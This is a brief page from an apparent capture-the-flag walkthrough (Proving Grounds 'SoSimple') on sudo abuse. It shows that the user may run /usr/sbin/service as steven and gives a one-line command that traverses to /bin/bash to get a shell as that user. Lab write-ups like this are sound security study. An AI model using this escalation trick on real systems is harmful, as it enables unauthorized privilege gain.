---
layout: default
title: Service
parent: Sudo
nav_order: 12
---

# Service

---

## Sudo -l

We can run _/usr/sbin/service_ as user _steven_

![sudo](../../../../assets/images/ctfs/proving_grounds/sosimple/sudo.png)

SU to Steven

```bash
sudo -u steven /usr/sbin/service ../../../../bin/bash
```

![steven](../../../../assets/images/ctfs/proving_grounds/sosimple/steven.png)
